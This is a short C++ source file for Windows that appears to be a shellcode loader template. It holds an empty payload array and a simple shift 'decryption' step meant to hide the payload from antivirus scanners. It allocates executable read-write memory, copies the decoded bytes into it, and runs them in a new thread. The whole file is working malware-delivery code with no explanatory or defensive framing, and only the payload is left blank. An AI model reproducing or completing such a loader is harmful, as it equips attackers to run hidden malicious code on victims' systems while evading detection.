#include <iostream>
#include <windows.h>

int main() {
    void* exec;
    HANDLE thread;

    unsigned char shellcode[] =
        "";

    // allocate space in memory
    exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // decrypt 
    int shift = 3;
    int i = 0;

    do {
        shellcode[i] = (int(shellcode[i]) - shift % 255);
        i++;
    } while (i < (sizeof(shellcode) - 1));

    // move decrypted shellcode to allocated memory
    RtlMoveMemory(exec, shellcode, sizeof(shellcode));

    // execute 
    thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec, 0, 0, 0);
    WaitForSingleObject(thread, -1);

}
